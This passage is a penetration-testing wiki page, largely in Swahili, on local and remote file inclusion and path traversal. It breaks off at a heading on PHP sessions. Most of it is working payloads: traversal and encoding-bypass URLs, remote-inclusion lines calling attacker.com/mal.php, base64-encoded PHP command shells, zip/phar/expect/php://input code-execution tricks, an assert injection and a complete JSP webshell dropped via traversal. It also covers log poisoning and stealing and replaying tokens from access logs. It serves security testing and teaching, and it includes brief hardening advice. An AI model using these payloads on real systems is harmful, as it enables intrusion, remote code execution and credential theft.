# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Faili inapakiwa kutoka kwenye seva ya mbali (Bora: Unaweza kuandika msimbo na seva itaitekeleza). Katika php hii **imezimwa** kwa chaguo-msingi (**allow_url_include**).\
**Local File Inclusion (LFI):** Seva inapakia faili ya ndani.

Udhaifu hutokea wakati mtumiaji anaweza kwa namna fulani kudhibiti faili itakayopakiwa na seva.

Zilizo hatarini **PHP functions**: require, require_once, include, include_once

Chombo cha kuvutia cha ku-exploit udhaifu huu: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Nimechanganya orodha kadhaa za \*nix LFI na kuongeza njia zaidi, niliunda hii:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Pia jaribu kubadilisha `/` for `\`\
Pia jaribu kuongeza `../../../../../`

Orodha inayotumia mbinu mbalimbali kugundua faili /etc/password (kuangalia kama udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Muungano wa wordlists tofauti:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Pia jaribu kubadilisha `/` for `\`\
Pia jaribu kuondoa `C:/` na kuongeza `../../../../../`

Orodha inayotumia mbinu mbalimbali kugundua faili /boot.ini (kuangalia kama udhaifu upo) inaweza kupatikana [here](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Angalia orodha ya LFI ya linux.

## Basic LFI and bypasses

Mifano yote ni kwa ajili ya Local File Inclusion lakini pia zinaweza kutumika kwa Remote File Inclusion (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences zimeondolewa bila kutumia recursion
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass kuongeza herufi zaidi mwishoni mwa kamba iliyotolewa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Hii imetatuliwa tangu PHP 5.4

### **Usimbaji**

Unaweza kutumia usimbaji usio wa kawaida kama double URL encode (na mengine):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Kutoka kwenye folda iliyopo

Labda back-end inaangalia njia ya folda:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Kuchunguza Miongozo ya Mfumo wa Faili kwenye server

Mfumo wa faili wa server unaweza kuchunguzwa kwa kurudia ili kubaini miongozo, sio tu faili, kwa kutumia mbinu fulani. Mchakato huu unahusisha kubaini kina cha miongozo na kuchunguza uwepo wa folda maalum. Hapa chini kuna njia ya kina ya kufikia hili:

1. **Baini Kina cha Miongozo:** Tambua kina cha miongozo yako ya sasa kwa kupata kwa mafanikio faili `/etc/passwd` (inayotumika ikiwa server ni ya Linux). Mfano wa URL unaweza kuundwa kama ifuatavyo, ukionyesha kina cha tatu:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Ongeza jina la folda unayeshukiwa (kwa mfano, `private`) kwenye URL, kisha rudi kwenye `/etc/passwd`. Ngazi ya ziada ya folda inahitaji kuongeza kina kwa moja:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tafsiri Matokeo:** Jibu la server linaonyesha ikiwa folda ipo:
- **Kosa / Hakuna Matokeo:** Folda `private` huenda haipo kwenye eneo lililotajwa.
- **Yaliyomo ya `/etc/passwd`:** Uwepo wa folda `private` umehakikishwa.
4. **Uchunguzi wa Rekursivu:** Folda zilizogunduliwa zinaweza kuchunguzwa zaidi kutafuta saraka ndogo au faili kwa kutumia mbinu ile ile au mbinu za kawaida za Local File Inclusion (LFI).

Kwa kuchunguza saraka katika maeneo tofauti ya mfumo wa faili, rekebisha payload ipasavyo. Kwa mfano, ili kuangalia ikiwa `/var/www/` ina saraka `private` (assuming the current directory is at a depth of 3), tumia:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation ni mbinu inayotumika kudanganya njia za faili katika programu za wavuti. Mara nyingi hutumika kufikia faili zilizozuiliwa kwa kupita baadhi ya hatua za usalama ambazo zinaongeza herufi za ziada mwishoni mwa njia za faili. Lengo ni kuunda njia ya faili ambayo, mara ikibadilishwa na hatua ya usalama, bado inaelekea kwenye faili linalotakiwa.

Katika PHP, matoleo tofauti ya njia ya faili yanaweza kuchukuliwa kuwa sawa kutokana na sifa za mfumo wa faili. Kwa mfano:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd`, na `/etc/passwd/` zote hutambuliwa kama njia ile ile.
- Wakati herufi 6 za mwisho ni `passwd`, kuongeza `/` (kufanya `passwd/`) hakubadilishi faili inayolengwa.
- Vivyo hivyo, ikiwa `.php` imeongezwa kwenye njia ya faili (kama `shellcode.php`), kuongeza `/.` mwishoni haitabadilisha faili inayofikiwa.

Mifano iliyopewa inaonyesha jinsi ya kutumia path truncation kufikia `/etc/passwd`, lengo la kawaida kwa sababu ya yaliyomo nyeti (taarifa za akaunti za watumiaji):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
Katika matukio haya, idadi ya traversals zinazohitajika inaweza kuwa karibu 2027, lakini namba hii inaweza kutofautiana kulingana na usanidi wa seva.

- **Kutumia Sehemu za Nukta na Herufi Zingine**: Mfululizo wa traversal (`../`) ukiunganishwa na sehemu za ziada za nukta na herufi unaweza kutumika kuvinjari mfumo wa faili, kwa ufanisi kupuuza mfuatano uliowekwa na seva (kama `.php`).
- **Kuweka Idadi Inayohitajika ya Traversals**: Kupitia majaribio na makosa, mtu anaweza kupata idadi kamili ya mfululizo wa `../` zinazohitajika kufika kwenye directory ya mzizi na kisha kwenda `/etc/passwd`, kuhakikisha kwamba mfuatano wowote uliowekwa (kama `.php`) umeondolewa lakini njia inayotakiwa (`/etc/passwd`) inabaki kamilifu.
- **Kuanza na directory feki**: Ni desturi ya kawaida kuanza njia na directory isiyo ya kweli (kama `a/`). Mbinu hii inatumiwa kama tahadhari au kutimiza mahitaji ya mantiki ya kuchambua njia ya seva.

Unapotumia mbinu za kukata njia (path truncation), ni muhimu kuelewa tabia ya seva ya kuchambua njia na muundo wa filesystem. Kila tukio linaweza kuhitaji mbinu tofauti, na mara nyingi majaribio yanahitajika kupata njia yenye ufanisi zaidi.

**Udhaifu huu umetatuliwa katika PHP 5.3.**

### **Mbinu za kuvuka vichujio**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

Katika php hii imezimwa kwa chaguo-msingi kwa sababu **`allow_url_include`** iko **Off.** Inapaswa kuwa **On** ili ifanye kazi, na katika hali hiyo unaweza kujumuisha faili ya PHP kutoka kwenye seva yako na kupata RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ikiwa kwa sababu fulani **`allow_url_include`** iko **On**, lakini PHP inachuja ufikiaji wa kurasa za nje, [kulingana na chapisho hiki](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), unaweza kutumia kwa mfano data protocol pamoja na base64 kufanya decode ya PHP code ya b64 na kupata RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> Kwenye code iliyotangulia, `+.txt` ya mwisho iliongezwa kwa sababu attacker alihitaji string ambayo inaisha na `.txt`, hivyo string inamalizika nayo na baada ya b64 decode sehemu hiyo itarudisha tu takataka na code halisi ya PHP itajumuishwa (na hivyo, itatekelezwa).

Mfano mwingine **kutotumia `php://` protocol** ungekuwa:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python Kipengele cha Mzizi

Katika Python, katika msimbo kama huu:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ikiwa mtumiaji ataingiza **absolute path** kwa **`file_name`**, **njia ya awali inaondolewa tu**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Hii ndilo tabia iliyokusudiwa kulingana na [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ikiwa sehemu ni njia kamili, sehemu zote zilizotangulia zinatupwa na kuunganishwa kunaendelea kutoka kwa sehemu ya njia kamili.

## Java - Orodha za direktori

Inaonekana kwamba ikiwa una Path Traversal katika Java na ukimuuliza **direktori** badala ya faili, **orodha ya direktori itarudishwa**. Hii haitatokea katika lugha nyingine (kwa kadiri ninavyofahamu).

## Vigezo 25 Bora

Hapa kuna orodha ya vigezo 25 ambazo zinaweza kuwa hatarini kwa local file inclusion (LFI) vulnerabilities (kutoka kwenye [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI kutumia PHP wrappers & protocols

### php://filter

PHP filters zinawezesha kufanya operesheni za msingi za **urekebishaji wa data** kabla ya kusomwa au kuandikwa. Kuna makundi 5 ya vichujio:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Ondoa tags kutoka kwa data (kila kitu kati ya "<" na ">" chars)
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Hubadilisha kwenda encoding tofauti (`convert.iconv.<input_enc>.<output_enc>`). Ili kupata **orodha ya encoding zote** zinazotegemezwa endesha kwenye console: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Inabana maudhui (faida ikiwa unafanya exfiltrating ya taarifa nyingi)
- `zlib.inflate`: Inarudisha data zilizobanwa
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Imepitwa na wakati
- `mdecrypt.*` : Imepitwa na wakati
- Other Filters
- Running in php `var_dump(stream_get_filters());` you can find a couple of **unexpected filters**:
- `consumed`
- `dechunk`: inarudisha encoding ya chunked ya HTTP
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Sehemu "php://filter" haizingatii tofauti kati ya herufi kubwa na ndogo

### Using php filters as oracle to read arbitrary files

[**In this post**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) inapendekeza mbinu ya kusoma faili ya ndani bila output kutolewa na server. Mbinu hii inategemea **boolean exfiltration of the file (char by char) using php filters** kama oracle. Hii ni kwa sababu php filters zinaweza kutumika kufanya maandishi kuwa makubwa vya kutosha kiasi kwamba php itaonyesha exception.

Katika post ya awali unaweza kupata maelezo ya kina ya mbinu, lakini hapa kuna muhtasari mfupi:

- Use the codec **`UCS-4LE`** ili kuweka herufi ya kwanza ya maandishi mwanzoni na kufanya ukubwa wa string uongezeke kwa kasi kubwa.
- Hii itatumika kuzalisha **text so big when the initial letter is guessed correctly** kiasi kwamba php itasababisha **error**
- The **dechunk** filter ita**remove everything if the first char is not an hexadecimal**, hivyo tunaweza kujua ikiwa char ya kwanza ni hex.
- Hii, ikichanganywa na ile ya awali (na filters nyingine kulingana na herufi inayokisiwa), itaturuhusu kukisia herufi mwanzoni mwa text kwa kuona wakati tunapofanya mabadiliko ya kutosha ili kufanya isiwe hexadecimal character. Kwa sababu ikiwa ni hex, dechunk haitaiondoa na bomu la awali litasababisha php error.
- The codec **convert.iconv.UNICODE.CP930** hubadilisha kila herufi kuwa ile inayofuata (kwa hiyo baada ya codec hii: a -> b). Hii inatuwezesha kugundua ikiwa herufi ya kwanza ni `a` kwa mfano kwa sababu ikiwa tutatumia mara 6 codec hii a->b->c->d->e->f->g herufi haitakuwa tena hexadecimal character, hivyo dechunk haitaiondoa na php error itachochewa kwa sababu inazidishwa na bomu la awali.
- Kwa kutumia mabadiliko mengine kama **rot13** mwanzoni inawezekana leak chars nyingine kama n, o, p, q, r (na codecs nyingine zinaweza kutumika kusogeza herufi nyingine kwenye hex range).
- Wakati char ya awali ni nambari inahitajika ku- base64 encode na leak herufi 2 za kwanza ili leak nambari.
- Tatizo la mwisho ni kuona **how to leak more than the initial letter**. Kwa kutumia order memory filters kama **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** inawezekana kubadilisha mpangilio wa chars na kupata nafasi ya kwanza herufi nyingine za text.
- Na ili kuwa na uwezo wa kupata **further data** wazo ni **generate 2 bytes of junk data at the beginning** kwa kutumia **convert.iconv.UTF16.UTF16**, tumia **UCS-4LE** ili **pivot with the next 2 bytes**, na d**elete the data until the junk data** (hii itaondoa first 2 bytes za text ya awali). Endelea kufanya hivi hadi ufikie biti unayotaka leak.

Katika post pia kulifichuliwa tool ya kufanya hili moja kwa moja: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Wrapper hii inaruhusu kufikia file descriptors ambazo process imefungua. Inaweza kuwa muhimu ku-exfiltrate content ya files zilizofunguliwa:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Unaweza pia kutumia **php://stdin, php://stdout and php://stderr** kufikia **file descriptors 0, 1 and 2** mtawaliwa (sijui hili lingeweza kuwa na faida gani katika shambulio)

### zip:// and rar://

Pakia faili ya Zip au Rar yenye PHPShell ndani na uifikie.\
Ili kuweza kutumiwa kwa ubaya, rar protocol **inahitaji kuamilishwa mahsusi**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Kumbuka kwamba protokoli hii imezuiliwa na usanidi wa php **`allow_url_open`** na **`allow_url_include`**

### expect://

Expect lazima iwe imewezeshwa. Unaweza execute code ukitumia hii:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Taja payload yako katika POST parameters:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Faili ya `.phar` inaweza kutumiwa kutekeleza PHP code wakati programu ya wavuti inapotumia functions kama `include` kwa upakiaji wa faili. Mfano wa PHP code uliopo hapa chini unaonyesha uundaji wa faili ya `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Ili kukusanya faili ya `.phar`, amri ifuatayo inapaswa kutekelezwa:
```bash
php --define phar.readonly=0 create_path.php
```
Mara baada ya kutekelezwa, faili iitwayo `test.phar` itaundwa, ambayo inaweza kutumika ku-exploit Local File Inclusion (LFI) vulnerabilities.

Kwenye matukio ambapo LFI inafanya tu kusoma faili bila kuendesha msimbo wa PHP uliomo, kupitia functions kama `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, au `filesize()`, inaweza kujaribishwa exploitation ya deserialization vulnerability. Hitilafu hii inahusiana na kusoma faili kwa kutumia protocol ya `phar`.

Kwa uelewa wa kina wa jinsi ya kutumia deserialization vulnerabilities katika muktadha wa faili za `.phar`, rejea hati iliyounganishwa hapa chini:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Ilikuwa inawezekana kutumia mbaya **any arbitrary file read from PHP that supports php filters** ili kupata RCE. Maelezo ya kina yanaweza [**found in this post**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Muhtasari mfupi: **3 byte overflow** kwenye PHP heap ilitumiwa mbaya ili **alter the chain of free chunks** za ukubwa maalum ili kuwa na uwezo wa **write anything in any address**, hivyo hook iliongezwa ili kuita **`system`**.\
Ilikuwa inawezekana ku-alloc chunks za ukubwa maalum kwa kutumia zaidi php filters.

### Protocols zingine

Angalia zaidi [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — Andika katika memory au katika faili ya muda (sijui jinsi hii inaweza kuwa muhimu katika file inclusion attack)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — Kupata mfumo wa faili wa ndani
- [http://](https://www.php.net/manual/en/wrappers.http.php) — Kupata URL za HTTP(s)
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — Kupata URL za FTP(s)
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — Compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — Tafuta pathnames zinazolingana na pattern (haitoi chochote kinachoweza kuchapishwa, hivyo siyo muhimu sana hapa)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — Audio streams (Si muhimu kusoma arbitrary files)

## LFI kupitia PHP 'assert'

Hatari za Local File Inclusion (LFI) katika PHP ni kubwa hasa wakati wa kushughulika na function ya 'assert', ambayo inaweza kuendesha msimbo uliomo ndani ya strings. Hii ni tatizo hasa ikiwa input inayojumuisha characters za directory traversal kama ".." inapokuwa inachunguzwa lakini haijasafishwa ipasavyo.

Kwa mfano, msimbo wa PHP unaweza kuundwa kuzuia directory traversal kama ifuatavyo:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Ingawa hili linalenga kuzuia traversal, kwa bahati mbaya linaunda vector kwa ajili ya code injection. Ili kufaidika na hili kwa kusoma yaliyomo ya faili, mshambuliaji anaweza kutumia:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Vivyo hivyo, kwa kutekeleza amri yoyote ya mfumo, mtu anaweza kutumia:
```plaintext
' and die(system("id")) or '
```
Ni muhimu **URL-encode payloads hizi**.

## PHP Blind Path Traversal

> [!WARNING]
> Teknika hii inahusiana katika kesi ambapo wewe **unadhibiti** **njia ya faili** ya **kazi ya PHP** ambayo ita**fikia faili** lakini hautaona yaliyomo ya faili (kama mwito rahisi kwa **`file()`**) na yaliyomo hayajaonyeshwa.

In [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) kunaelezwa jinsi blind path traversal inaweza kutumiwa kupitia PHP filter ili **exfiltrate the content of a file via an error oracle**.

Kwa muhtasari, teknika inatumia **"UCS-4LE" encoding** kufanya yaliyomo ya faili kuwa kubwa sana kiasi kwamba **PHP function** inayofungua faili itasababisha **error**.

Kisha, ili leak the first char filter **`dechunk`** inatumika pamoja na nyingine kama **base64** au **rot13**, na hatimaye filters **convert.iconv.UCS-4.UCS-4LE** na **convert.iconv.UTF16.UTF-16BE** zinatumika ili **place other chars at the beggining and leak them**.

**Functions that might be vulnerable**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Kwa maelezo ya kiufundi angalia post iliyotajwa!

## LFI2RCE

### Kuandika Faili Bila Idhini kwa Path Traversal (Webshell RCE)

Wakati msimbo upande wa server unaopokea/kuupload faili unajenga njia ya lengo ukitumia data inayodhibitiwa na mtumiaji (mf., jina la faili au URL) bila kuifanya canonical na kuithibitisha, sehemu za `..` na absolute paths zinaweza kutoroka kutoka directory iliyokusudiwa na kusababisha kuandika faili bila idhini. Ikiwa unaweza kuweka payload chini ya directory inayofikika kwenye web, kawaida unapata unauthenticated RCE kwa kuangusha webshell.

Mtiririko wa kawaida wa exploitation:
- Tambua primitive ya kuandika katika endpoint au background worker inayokubali path/filename na kuandika yaliyomo kwenye disk (mf., message-driven ingestion, XML/JSON command handlers, ZIP extractors, n.k.).
- Tambua directories zinazofunguliwa kwenye web. Mifano ya kawaida:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Tengeneza path ya traversal inayovunja kutoka directory ya kuhifadhi iliyokusudiwa hadi webroot, na jumuisha yaliyomo ya webshell yako.
- Tembelea payload uliyoweka na utekeleze amri.

Vidokezo:
- Huduma iliyo vunishwaji inayofanya uandishi inaweza kusikiliza kwenye port isiyo-HTTP (mf., JMF XML listener on TCP 4004). Portal kuu ya web (port tofauti) baadaye itahudumia payload yako.
- Katika Java stacks, uandishi wa faili mara nyingi hufanywa kwa concatenation rahisi ya `File`/`Paths`. Ukosefu wa canonicalisation/allow-listing ndilo hitilafu kuu.

Mfano wa jumla wa mtindo wa XML/JMF (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Uimarishaji unaoueza kuzuia darasa hili la bugs:
- Tafuta canonical path na thibitisha ni mtoto wa directory ya msingi iliyoorodheshwa (allow-listed).
- Kataa njia yoyote yenye `..`, absolute roots, au drive letters; tumia majina ya faili yaliyotengenezwa.
- Endesha writer kama account yenye ruhusa ndogo na tengeneza utofautishaji kati ya directories za kuandika na served roots.

## Remote File Inclusion

Imefafanuliwa hapo awali, [**follow this link**](#remote-file-inclusion).

### Via Apache/Nginx log file

Iwapo server ya Apache au Nginx iko **vulnerable to LFI** ndani ya include function unaweza kujaribu kufikia **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, weka ndani ya **user agent** au ndani ya **GET parameter** php shell kama **`<?php system($_GET['c']); ?>`** na include ile file

> [!WARNING]
> Tambua kwamba **kama utatumia double quotes** kwa shell badala ya **simple quotes**, double quotes zitabadilishwa kwa ajili ya string "_**quote;**_", **PHP will throw an error** hapo na **hakuna kitu kingine kitakachotekelezwa**.
>
> Pia, hakikisha una **andika payload kwa usahihi** au PHP itatoa error kila inapojaribu kupakia log file na huta kuwa na nafasi ya pili.

Hii pia inaweza kufanywa katika logi nyingine lakini **kuwa mwangalifu,** msimbo ndani ya logi unaweza kuwa URL encoded na hii inaweza kuharibu Shell. Header ya **authorisation "basic"** ina "user:password" kwa Base64 na inakadiriwa (decoded) ndani ya logi. The PHPShell inaweza kuingizwa ndani ya header hii.\
Other possible log paths:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Soma access logs ili kuvuna GET-based auth tokens (token replay)

Mengi ya apps hukubali kwa kosa session/auth tokens kupitia GET (e.g., AuthenticationToken, token, sid). Ikiwa una path traversal/LFI primitive ndani ya web server logs, unaweza kuiba token hizo kutoka access logs na kuzireplay ili kupita kabisa authentication.

How-to:
- Tumia traversal/LFI kusoma web server access log. Maeneo ya kawaida:
- /var/log/apache2/access.log, /var/log/httpd/access_log
- /var/log/nginx/access.log
- Baadhi ya endpoints hurudisha file reads zikiwa Base64-encoded. Ikiwa ni hivyo, decode lokalini na tazama mistari ya log.
- Tumia grep kutafuta GET requests zinazojumuisha token parameter na chukua thamani yake, kisha replay dhidi ya application entry point.

Example flow (generic):
```http
GET /vuln/asset?name=..%2f..%2f..%2f..%2fvar%2flog%2fapache2%2faccess.log HTTP/1.1
Host: target
```
Dekoda mwili ikiwa ni Base64, kisha rudisha token iliyokamatwa:
```http
GET /portalhome/?AuthenticationToken=<stolen_token> HTTP/1.1
Host: target
```
Vidokezo:
- Tokens in URLs are logged by default; never accept bearer tokens via GET in production systems.
- Ikiwa app inasaidia majina mengi ya token, tafuta funguo za kawaida kama AuthenticationToken, token, sid, access_token.
- Badilisha token zozote ambazo zinaweza kuwa leaked kwenye logs.

### Kupitia Barua Pepe

**Tuma barua** kwa akaunti ya ndani (user@localhost) inayobeba PHP payload yako kama `<?php echo system($_REQUEST["cmd"]); ?>` na jaribu kufanya include kwenye barua ya mtumiaji kwa path kama **`/var/mail/<USERNAME>`** au **`/var/spool/mail/<USERNAME>`**

### Kupitia /proc/*/fd/*

1. Pakia shells nyingi (kwa mfano: 100)
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), ambapo $PID = PID ya process (can be brute forced) na $FD ni file descriptor (can be brute forced too)

### Kupitia /proc/self/environ

Kama log file, tuma payload katika User-Agent; itaonekana ndani ya faili /proc/self/environ
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Kupakia

Ikiwa unaweza kupakia faili, ingiza tu shell payload ndani yake (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Ili faili iwe rahisi kusoma ni bora kuingiza kwenye metadata ya picha/doc/pdf

### Kupitia upakiaji wa ZIP

Pakia faili la ZIP lenye PHP shell iliyobanwa na upate ufikiaji:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Kupitia PHP sessions
